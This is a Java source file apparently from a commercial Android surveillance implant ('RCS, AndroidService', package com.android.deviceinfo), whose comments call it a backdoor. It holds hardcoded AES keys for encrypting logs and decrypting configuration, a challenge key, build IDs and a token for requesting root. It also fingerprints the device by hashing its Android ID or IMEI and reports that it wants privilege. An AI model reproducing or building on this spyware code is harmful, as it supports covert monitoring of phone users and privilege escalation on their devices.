/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : KeysFake.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.crypto;

import android.content.Context;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;

import com.android.deviceinfo.Device;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.interfaces.iKeys;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.Check;

/**
 * The Class KeysFake.
 */
public class KeysFake implements iKeys {
	// 20 bytes that uniquely identifies the device (non-static on purpose)
	/** The g_ instance id. */
	private static byte[] instanceId;

	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
	/** The Constant g_BackdoorID. */
	private static byte[] backdoorId;

	// AES key used to encrypt logs
	/** The Constant g_AesKey. */
	private static byte[] aesKey;

	// AES key used to decrypt configuration
	/** The Constant g_ConfKey. */
	private static byte[] confKey;

	// Challenge key
	/** The Constant g_Challenge. */
	private static byte[] challengeKey;

	// Demo key
	private static byte[] demoMode;

	// Privilege key
	private static byte[] rootRequest;

	// Random seed
	private static byte[] randomSeed;

	private static final String TAG = "KeysFake";

	// RCS 134 "RCS 8_2" su polluce
	byte[] AesKey = ByteArray.hexStringToByteArray("5f35bdc580b5247007ed0cf886d9f0af622cdbd8fce2c6ba6b494ab0c2d5bbb5",
			0, 32);
	byte[] ConfKey = ByteArray.hexStringToByteArray("babb12b3f748642c2d7a138d934f68ebc37987aabee1688a207cb3fc1abb7f51",
			0, 32);
	byte[] ChallengeKey = ByteArray.hexStringToByteArray("663ba670502a7be468f70079fb69eefdab377549aeb03857a97258e5893e37ae", 0, 32);
	String BuildId = "RCS_0000000134";

	// RCS 1 "Test8" su zenotto
	/*
	 * byte[] AesKey = ByteArray.hexStringToByteArray(
	 * "c9ad17aa2b9404b04349dd8bcf44feaecf282a99fed09b979b26c0bcf6bc9dcc", 0,
	 * 32); byte[] ConfKey = ByteArray.hexStringToByteArray(
	 * "a10137957489926d5c7d7f0f57e91c36f8fabc015fa8086312e48af2933f16f2", 0,
	 * 32); byte[] ChallengeKey = ByteArray.hexStringToByteArray(
	 * "60fa683c112b78050dc6fd190d0214a8384dfdba594b31a2aa61ce6bfb33f6af", 0,
	 * 32); String BuildId = "RCS_0000000001";
	 * 
	 * 
	 * 
	 * Using factory: RCS_0000001312 TestCalor

	-> LOGKEY   : 0bc1d2a637b46e64c47bec3b50491e372ec91dabec08317ee00fdcca3cf6e700
	-> CONFKEY  : e5f6955f4d62e70d978c7ceb164acf8bf1ac8fed689c442958f8af8430d346bb
	-> SIGNATURE: 572ebc94391281ccf53a851330bb0d996fbdbf803c194cbf0b1058928b9929d2

CONFIG JSON:
	 */

	// Get root
	byte[] RootRequest = "IrXCtyrrDXMJEvOU".getBytes();

	// Don't get root
	// byte[] RootRequest = "IrXCtyrrDXMJEvOUbs".getBytes();

	protected KeysFake() {

		String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
		if (androidId == null) {
			androidId = "EMPTY";
		}

		// 20.0=9774d56d682e549c M.d("9774d56d682e549c")
		if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
			// http://code.google.com/p/android/issues/detail?id=10603
			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
			final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
					Context.TELEPHONY_SERVICE);

			final String imei = telephonyManager.getDeviceId();
			androidId = imei;
		}

		if (Cfg.DEBUGKEYS) {
			Check.log(TAG + " (Keys), androidId: " + androidId);
		}

		instanceId = Digest.SHA1(androidId.getBytes());
	}

	protected byte[] getRootRequest() {
		return RootRequest;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getAesKey()
	 */
	@Override
	public byte[] getAesKey() {
		return AesKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getChallengeKey()
	 */
	@Override
	public byte[] getChallengeKey() {
		return ChallengeKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getConfKey()
	 */
	@Override
	public byte[] getConfKey() {
		return ConfKey;
	}

	/*
	 * public byte[] getInstanceId() { return g_InstanceId; }
	 */

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getBuildId()
	 */
	@Override
	public byte[] getBuildId() {
		return BuildId.getBytes();
	}

	@Override
	public boolean hasBeenBinaryPatched() {
		return true;
	}

	@Override
	public boolean wantsPrivilege() {
		return true;
	}

	@Override
	/**
	 * Gets the instance id.
	 * 
	 * @return the instance id
	 */
	public byte[] getInstanceId() {
		return instanceId;
	}

}
